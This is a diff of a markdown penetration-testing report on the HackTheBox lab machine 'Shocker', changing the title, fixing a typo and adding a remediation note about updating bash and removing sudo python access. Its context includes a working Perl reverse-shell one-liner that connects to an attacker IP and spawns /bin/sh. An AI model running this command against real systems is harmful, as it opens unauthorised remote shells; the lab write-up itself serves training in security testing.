@@ -15,7 +15,7 @@ book: true
 classoption: oneside
 code-block-font-size: \scriptsize
 ---
-# Pentesting Report - Bashed
+# Pentesting Report - Shocker
 
 ## Introduction
 
@@ -314,7 +314,7 @@ We execute this script to create an reverse shell outside our environment:
 perl -e 'use Socket;$i="10.10.14.20";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-We gain access to the box an find the user flag:
+We gain access to the box and find the user flag:
 
 ```
 ┌──(user㉿kali)-[~/hackthebox/hackthebox/shocker]
@@ -375,6 +375,8 @@ root
 ![ImgPlaceholder](screenshots/root-flag.png)
 
 **Vulnerability Fix:**
+
+update bash, removal /usr/bin/python root for shelly in sudo.
 
 ## Sample Report - Maintaining Access
 
